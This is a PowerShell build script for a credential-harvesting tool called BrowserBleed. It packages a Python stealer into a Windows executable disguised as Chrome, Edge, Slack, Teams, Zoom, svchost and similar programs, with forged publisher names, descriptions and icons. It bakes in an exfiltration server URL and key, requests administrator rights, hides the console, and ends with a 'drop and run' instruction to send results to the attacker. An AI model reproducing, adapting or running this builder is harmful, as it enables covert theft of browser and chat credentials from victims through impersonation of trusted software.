# build_windows.ps1 -builds a credential-harvesting exe with the report server baked in.
# Run from the repo root in PowerShell (no arguments needed if deploy/config is populated):
#   .\build_windows.ps1 -Preset chrome
#
# The resulting exe auto-exfils on every run and leaves no local files on the target.
# Override at runtime with: --out PATH  --exfil URL  --exfil-key KEY
#
# Available presets:
#   Browsers:  chrome, edge, brave, firefox, opera
#   Chat:      slack, discord, teams, zoom, whatsapp, telegram
#
# Examples:
#   .\build_windows.ps1 -Preset chrome
#   .\build_windows.ps1 -Preset slack
#   .\build_windows.ps1 -Preset teams -ExfilUrl https://reports.example.com -ExfilKey mykey
#   .\build_windows.ps1 -ExeName svchost -Company "Microsoft Corporation" -FileDesc "Host Process for Windows Services"

param(
    [string]$Preset    = "",
    [string]$ExfilUrl  = "",
    [string]$ExfilKey  = "",
    [string]$ExeName   = "",
    [string]$IconFile  = "",    # path to .ico or .exe to extract icon from (auto-set by preset)
    [string]$Company   = "",    # CompanyName in Properties (auto-set by preset)
    [string]$FileDesc  = ""     # FileDescription in Properties (auto-set by preset)
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

# ── Preset definitions ────────────────────────────────────────────────────────
$presetDefs = @{
    # Browsers
    "chrome"    = @{
        ExeName   = "chrome"
        Company   = "Google LLC"
        Desc      = "Google Chrome"
        IconPaths = @(
            "C:\Program Files\Google\Chrome\Application\chrome.exe",
            "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
        )
    }
    "edge"      = @{
        ExeName   = "edge"
        Company   = "Microsoft Corporation"
        Desc      = "Microsoft Edge"
        IconPaths = @(
            "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
            "C:\Program Files\Microsoft\Edge\Application\msedge.exe"
        )
    }
    "brave"     = @{
        ExeName   = "brave"
        Company   = "Brave Software, Inc"
        Desc      = "Brave Browser"
        IconPaths = @(
            "C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"
        )
    }
    "firefox"   = @{
        ExeName   = "firefox"
        Company   = "Mozilla Corporation"
        Desc      = "Mozilla Firefox"
        IconPaths = @(
            "C:\Program Files\Mozilla Firefox\firefox.exe",
            "C:\Program Files (x86)\Mozilla Firefox\firefox.exe"
        )
    }
    "opera"     = @{
        ExeName   = "opera"
        Company   = "Opera Software AS"
        Desc      = "Opera internet browser"
        IconPaths = @(
            "$env:LOCALAPPDATA\Programs\Opera\opera.exe",
            "C:\Program Files\Opera\opera.exe"
        )
    }
    # Chat apps
    "slack"     = @{
        ExeName   = "slack"
        Company   = "Slack Technologies, Inc."
        Desc      = "Slack"
        IconPaths = @(
            "$env:LOCALAPPDATA\slack\slack.exe"
        )
    }
    "discord"   = @{
        ExeName   = "Discord"
        Company   = "Discord Inc."
        Desc      = "Discord"
        IconPaths = @(
            "$env:LOCALAPPDATA\Discord\app-*\Discord.exe",
            "$env:LOCALAPPDATA\Discord\Update.exe"
        )
    }
    "teams"     = @{
        ExeName   = "ms-teams"
        Company   = "Microsoft Corporation"
        Desc      = "Microsoft Teams"
        IconPaths = @(
            "$env:LOCALAPPDATA\Microsoft\Teams\current\Teams.exe",
            "C:\Program Files\Microsoft\Teams\current\Teams.exe"
        )
    }
    "zoom"      = @{
        ExeName   = "Zoom"
        Company   = "Zoom Video Communications, Inc."
        Desc      = "Zoom"
        IconPaths = @(
            "$env:APPDATA\Zoom\bin\Zoom.exe",
            "C:\Program Files\Zoom\bin\Zoom.exe",
            "C:\Program Files (x86)\Zoom\bin\Zoom.exe"
        )
    }
    "whatsapp"  = @{
        ExeName   = "WhatsApp"
        Company   = "WhatsApp LLC"
        Desc      = "WhatsApp"
        IconPaths = @(
            "$env:LOCALAPPDATA\WhatsApp\WhatsApp.exe"
        )
    }
    "telegram"  = @{
        ExeName   = "Telegram"
        Company   = "Telegram FZ-LLC"
        Desc      = "Telegram Desktop"
        IconPaths = @(
            "$env:APPDATA\Telegram Desktop\Telegram.exe"
        )
    }
}

# ── Apply preset ──────────────────────────────────────────────────────────────
if ($Preset) {
    $key = $Preset.ToLower()
    if (-not $presetDefs.ContainsKey($key)) {
        Write-Host "Unknown preset '$Preset'. Available presets:"
        Write-Host "  Browsers: chrome, edge, brave, firefox, opera"
        Write-Host "  Chat:     slack, discord, teams, zoom, whatsapp, telegram"
        exit 1
    }
    $def = $presetDefs[$key]
    if (-not $ExeName)  { $ExeName  = $def.ExeName }
    if (-not $Company)  { $Company  = $def.Company }
    if (-not $FileDesc) { $FileDesc = $def.Desc    }
    if (-not $IconFile) {
        # Check icons/ directory first (.ico preferred, .png also accepted by PyInstaller)
        $iconsDir = Join-Path $PSScriptRoot "icons"
        $bundled  = @("$key.ico", "$key.png") | ForEach-Object { Join-Path $iconsDir $_ } | Where-Object { Test-Path $_ } | Select-Object -First 1
        if ($bundled) {
            $IconFile = $bundled
        } else {
            foreach ($pattern in $def.IconPaths) {
                $found = Get-Item $pattern -ErrorAction SilentlyContinue | Select-Object -First 1
                if (-not $found) { continue }
                if ($found.FullName -like "*\WindowsApps\*") { continue }
                try {
                    $s = [System.IO.File]::OpenRead($found.FullName); $s.Close()
                    $IconFile = $found.FullName; break
                } catch { continue }
            }
            if (-not $IconFile) {
                Write-Host "[!] No icon for $($def.Desc) - add icons\$key.ico or icons\$key.png to fix"
            }
        }
    }
}

# ── Interactive preset menu (shown when no -Preset or -ExeName given) ─────────
if (-not $ExeName -and -not $Preset) {
    # Plain array indexed from 1 (index 0 is unused). OrderedDictionary with integer keys
    # indexes by position, not key value, so we use a regular array to avoid that pitfall.
    $menuPresets = @($null, "chrome", "edge", "brave", "firefox", "opera", "slack", "discord", "teams", "zoom", "whatsapp", "telegram")

    Write-Host ""
    Write-Host "Select a disguise preset:"
    Write-Host ""
    Write-Host "  BROWSERS"
    Write-Host "  [1]  Chrome     - chrome   (Google LLC)"
    Write-Host "  [2]  Edge       - edge     (Microsoft Corporation)"
    Write-Host "  [3]  Brave      - brave    (Brave Software, Inc)"
    Write-Host "  [4]  Firefox    - firefox  (Mozilla Corporation)"
    Write-Host "  [5]  Opera      - opera    (Opera Software AS)"
    Write-Host ""
    Write-Host "  CHAT APPS"
    Write-Host "  [6]  Slack      - slack                    (Slack Technologies, Inc.)"
    Write-Host "  [7]  Discord    - Discord                  (Discord Inc.)"
    Write-Host "  [8]  Teams      - ms-teams                 (Microsoft Corporation)"
    Write-Host "  [9]  Zoom       - Zoom                     (Zoom Video Communications)"
    Write-Host "  [10] WhatsApp   - WhatsApp                 (WhatsApp LLC)"
    Write-Host "  [11] Telegram   - Telegram                 (Telegram FZ-LLC)"
    Write-Host ""
    $choice = Read-Host "Enter number"

    [int]$n = 0
    if ([int]::TryParse($choice, [ref]$n) -and $n -ge 1 -and $n -le ($menuPresets.Length - 1)) {
        $Preset = $menuPresets[$n]
        $key    = $Preset.ToLower()
        $def    = $presetDefs[$key]
        if (-not $ExeName)  { $ExeName  = $def.ExeName }
        if (-not $Company)  { $Company  = $def.Company }
        if (-not $FileDesc) { $FileDesc = $def.Desc    }
        if (-not $IconFile) {
            $iconsDir = Join-Path $PSScriptRoot "icons"
            $bundled  = @("$key.ico", "$key.png") | ForEach-Object { Join-Path $iconsDir $_ } | Where-Object { Test-Path $_ } | Select-Object -First 1
            if ($bundled) {
                $IconFile = $bundled
            } else {
                foreach ($pattern in $def.IconPaths) {
                    $found = Get-Item $pattern -ErrorAction SilentlyContinue | Select-Object -First 1
                    if (-not $found) { continue }
                    if ($found.FullName -like "*\WindowsApps\*") { continue }
                    try {
                        $s = [System.IO.File]::OpenRead($found.FullName); $s.Close()
                        $IconFile = $found.FullName; break
                    } catch { continue }
                }
                if (-not $IconFile) {
                    Write-Host "[!] No icon for $($def.Desc) - add icons\$key.ico or icons\$key.png to fix"
                }
            }
        }
    } else {
        Write-Error "Invalid selection. Run again and enter a number from the list."
        exit 1
    }
}

if (-not $ExeName) {
    Write-Error "Specify -Preset, -ExeName, or run without arguments for the interactive menu."
    exit 1
}

# ── Fallback metadata ─────────────────────────────────────────────────────────
if (-not $Company)  { $Company  = "Microsoft Corporation" }
if (-not $FileDesc) { $FileDesc = $ExeName                }

# ── Load deploy/config if exfil values not passed in ─────────────────────────
if (-not $ExfilUrl -or -not $ExfilKey) {
    $configPath = Join-Path $PSScriptRoot "deploy\config"
    if (Test-Path $configPath) {
        foreach ($line in Get-Content $configPath) {
            if ($line -match '^DOMAIN=(.+)$'     -and -not $ExfilUrl) { $ExfilUrl = "https://$($Matches[1])" }
            if ($line -match '^BB_API_KEY=(.+)$' -and -not $ExfilKey) { $ExfilKey = $Matches[1].Trim() }
        }
    }
}

if (-not $ExfilUrl) { Write-Error "ExfilUrl not set -add DOMAIN to deploy/config or pass -ExfilUrl"; exit 1 }
if (-not $ExfilKey) { Write-Error "ExfilKey not set -add BB_API_KEY to deploy/config or pass -ExfilKey"; exit 1 }

Write-Host "[*] Building $ExeName.exe"
Write-Host "    Exfil URL:    $ExfilUrl"
Write-Host "    Exfil key:    $($ExfilKey.Substring(0,4))****"
Write-Host "    Process name: $ExeName"
Write-Host "    Description:  $FileDesc ($Company)"
if ($IconFile) { Write-Host "    Icon:         $IconFile" }

# ── Patch a temp copy of the source ──────────────────────────────────────────
$src    = Join-Path $PSScriptRoot "BrowserBleed.py"
$tmpSrc = Join-Path $env:TEMP "BrowserBleed_build.py"

$patched = (Get-Content $src -Raw -Encoding utf8) `
    -replace '_EXFIL_URL: str = ""', "_EXFIL_URL: str = `"$ExfilUrl`"" `
    -replace '_EXFIL_KEY: str = ""', "_EXFIL_KEY: str = `"$ExfilKey`""
if ($patched -notmatch [regex]::Escape($ExfilUrl) -or $patched -notmatch [regex]::Escape($ExfilKey)) {
    Write-Error "Substitution failed - URL/key not found in patched source. Aborting."
    exit 1
}
$patched | Set-Content -Path $tmpSrc -Encoding utf8

# ── Generate version-info file ────────────────────────────────────────────────
$verFile = Join-Path $env:TEMP "bb_version.txt"
@"
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(1, 0, 0, 0), prodvers=(1, 0, 0, 0),
    mask=0x3f, flags=0x0, OS=0x40004, fileType=0x1, subtype=0x0,
    date=(0, 0)),
  kids=[
    StringFileInfo([
      StringTable(u'040904B0', [
        StringStruct(u'CompanyName',      u'$Company'),
        StringStruct(u'FileDescription',  u'$FileDesc'),
        StringStruct(u'FileVersion',      u'1.0.0.0'),
        StringStruct(u'InternalName',     u'$ExeName'),
        StringStruct(u'OriginalFilename', u'$ExeName.exe'),
        StringStruct(u'ProductName',      u'$FileDesc'),
        StringStruct(u'ProductVersion',   u'1.0.0.0')])
    ]),
    VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
  ]
)
"@ | Set-Content -Path $verFile -Encoding utf8

# ── Build ─────────────────────────────────────────────────────────────────────
$distDir = Join-Path $PSScriptRoot "payloads"
if (-not (Test-Path $distDir)) { New-Item -ItemType Directory $distDir | Out-Null }

$buildTmp = Join-Path $env:TEMP "bb_build"
$iconArgs = if ($IconFile -and (Test-Path $IconFile)) { @("--icon", $IconFile) } else { @() }

python -m PyInstaller `
    --onefile --noconsole --uac-admin `
    --name $ExeName `
    --version-file $verFile `
    @iconArgs `
    --distpath $distDir `
    --workpath $buildTmp `
    --specpath $buildTmp `
    $tmpSrc

Remove-Item $tmpSrc  -Force -ErrorAction SilentlyContinue
Remove-Item $verFile  -Force -ErrorAction SilentlyContinue
Remove-Item $buildTmp -Recurse -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "[+] Done: $distDir\$ExeName.exe"
Write-Host "    Drop and run - results auto-exfil to $ExfilUrl"
